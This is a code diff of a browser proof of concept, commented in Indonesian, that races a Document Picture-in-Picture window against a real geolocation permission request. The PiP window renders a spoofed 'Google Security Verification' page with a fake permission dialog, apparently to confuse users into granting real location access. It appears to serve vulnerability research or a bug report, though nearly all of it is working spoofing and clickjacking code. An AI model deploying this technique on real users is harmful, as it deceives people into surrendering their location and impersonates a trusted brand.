@@ -33,14 +33,14 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[Fullscreen PiP + Location] " + msg);
+    console.log("[PiP + Location Race] " + msg);
   }
 
   // ============================================
   // 1. TRIGGER (KLIK) - RACE CONDITION
   // ============================================
   btn.addEventListener('click', async function() {
-    log("[*] Memulai fullscreen PiP + location race...");
+    log("[*] Memulai PiP + location race...");
 
     try {
       if (!window.documentPictureInPicture) {
@@ -49,29 +49,114 @@
       }
 
       // ============================================
-      // 2. BUKA PiP (UKURAN BESAR)
+      // 2. BUKA PiP & MINTA IZIN LOKASI BERSAMAAN (0ms)
       // ============================================
-      const pipWindow = await documentPictureInPicture.requestWindow({
-        width: 1920,
-        height: 1080
-      });
+      
+      // A. Buka PiP (async)
+      const pipPromise = (async () => {
+        try {
+          const pipWindow = await documentPictureInPicture.requestWindow({
+            width: 500,
+            height: 400
+          });
 
-      log('PiP Window Opened. Size: ' + pipWindow.innerWidth + 'x' + pipWindow.innerHeight);
+          // Tulis konten PiP (UI palsu)
+          pipWindow.document.open();
+          pipWindow.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+              <meta charset="UTF-8">
+              <title>Google Security Verification</title>
+              <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body {
+                  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                  background: #fff;
+                  display: flex;
+                  flex-direction: column;
+                  justify-content: center;
+                  align-items: center;
+                  min-height: 100vh;
+                  padding: 20px;
+                  text-align: center;
+                }
+                .g-logo {
+                  font-size: 48px;
+                  font-weight: bold;
+                  color: #4285f4;
+                  margin-bottom: 20px;
+                }
+                h3 { font-size: 24px; color: #333; margin-bottom: 10px; }
+                p { font-size: 14px; color: #666; margin-bottom: 20px; }
+                .fake-prompt {
+                  background: #fff;
+                  border: 1px solid #ddd;
+                  border-radius: 12px;
+                  padding: 25px;
+                  box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+                  text-align: center;
+                  max-width: 350px;
+                  width: 100%;
+                }
+                .fake-prompt h4 { font-size: 18px; color: #333; margin-bottom: 10px; }
+                .fake-prompt p { font-size: 13px; color: #666; margin-bottom: 20px; }
+                .fake-prompt button {
+                  padding: 12px 24px;
+                  margin: 5px;
+                  border: none;
+                  border-radius: 6px;
+                  font-size: 14px;
+                  font-weight: bold;
+                  cursor: pointer;
+                }
+                .fake-prompt .allow { background: #1a73e8; color: #fff; }
+                .fake-prompt .block { background: #f0f0f0; color: #333; }
+                .footer {
+                  margin-top: 20px;
+                  font-size: 11px;
+                  color: #999;
+                }
+              </style>
+            </head>
+            <body>
+              <div class="g-logo">G</div>
+              <h3>Google Security Verification</h3>
+              <p>Please allow location access to continue.</p>
 
-      // ============================================
-      // 3. PAKSA FULLSCREEN
-      // ============================================
-      try {
-        pipWindow.resizeTo(screen.width, screen.height);
-        pipWindow.moveTo(0, 0);
-      } catch (e) {
-        log('Resize error: ' + e.message);
-      }
+              <div class="fake-prompt">
+                <h4>accounts.google.com ingin menggunakan lokasi Anda</h4>
+                <p>This is a simulated permission prompt.</p>
+                <button class="block" id="fakeBlock">Blokir</button>
+                <button class="allow" id="fakeAllow">Izinkan</button>
+              </div>
 
-      // ============================================
-      // 4. MINTA IZIN LOKASI (RACE CONDITION)
-      // ============================================
-      // Panggil getCurrentPosition segera setelah PiP fullscreen.
+              <div class="footer">This is a simulated phishing test. Do not enter real credentials.</div>
+
+              <script>
+                (function() {
+                  document.getElementById('fakeAllow').addEventListener('click', function() {
+                    window.location.href = 'https://www.google.com';
+                  });
+
+                  document.getElementById('fakeBlock').addEventListener('click', function() {
+                    window.close();
+                  });
+                })();
+              <\/script>
+            </body>
+            </html>
+          `);
+          pipWindow.document.close();
+
+          return pipWindow;
+        } catch (e) {
+          log("PiP Error: " + e.message);
+          return null;
+        }
+      })();
+
+      // B. Minta izin lokasi (LANGSUNG, 0ms)
       try {
         log("[*] Meminta Izin Lokasi...");
         
@@ -89,99 +174,11 @@
         log("[-] Geolocation error: " + e.message);
       }
 
-      // ============================================
-      // 5. TULIS KONTEN PiP (UI PALSU FULLSCREEN)
-      // ============================================
-      pipWindow.document.open();
-      pipWindow.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <meta charset="UTF-8">
-          <title>Google Security Verification</title>
-          <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body {
-              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-              background: #fff;
-              display: flex;
-              flex-direction: column;
-              justify-content: center;
-              align-items: center;
-              min-height: 100vh;
-              padding: 20px;
-              text-align: center;
-              overflow: hidden;
-            }
-            .g-logo {
-              font-size: 64px;
-              font-weight: bold;
-              color: #4285f4;
-              margin-bottom: 30px;
-            }
-            h3 { font-size: 32px; color: #333; margin-bottom: 20px; }
-            p { font-size: 18px; color: #666; margin-bottom: 30px; }
-            .fake-prompt {
-              background: #fff;
-              border: 1px solid #ddd;
-              border-radius: 16px;
-              padding: 40px;
-              box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-              text-align: center;
-              max-width: 500px;
-              width: 100%;
-            }
-            .fake-prompt h4 { font-size: 24px; color: #333; margin-bottom: 15px; }
-            .fake-prompt p { font-size: 16px; color: #666; margin-bottom: 30px; }
-            .fake-prompt button {
-              padding: 15px 40px;
-              margin: 10px;
-              border: none;
-              border-radius: 8px;
-              font-size: 18px;
-              font-weight: bold;
-              cursor: pointer;
-            }
-            .fake-prompt .allow { background: #1a73e8; color: #fff; }
-            .fake-prompt .block { background: #f0f0f0; color: #333; }
-            .footer {
-              margin-top: 30px;
-              font-size: 14px;
-              color: #999;
-            }
-          </style>
-        </head>
-        <body>
-          <div class="g-logo">G</div>
-          <h3>Google Security Verification</h3>
-          <p>Please allow location access to continue.</p>
-
-          <div class="fake-prompt">
-            <h4>accounts.google.com ingin menggunakan lokasi Anda</h4>
-            <p>This is a simulated permission prompt.</p>
-            <button class="block" id="fakeBlock">Blokir</button>
-            <button class="allow" id="fakeAllow">Izinkan</button>
-          </div>
-
-          <div class="footer">This is a simulated phishing test. Do not enter real credentials.</div>
-
-          <script>
-            (function() {
-              document.getElementById('fakeAllow').addEventListener('click', function() {
-                window.location.href = 'https://www.google.com';
-              });
-
-              document.getElementById('fakeBlock').addEventListener('click', function() {
-                window.close();
-              });
-            })();
-          <\/script>
-        </body>
-        </html>
-      `);
-      pipWindow.document.close();
-
-      log('PiP UI ready. Location prompt triggered.');
+      // C. Tunggu PiP siap
+      const pipWindow = await pipPromise;
+      if (pipWindow) {
+        log('PiP Window Opened. Location prompt triggered simultaneously.');
+      }
 
     } catch (e) {
       log('Error: ' + e.message);
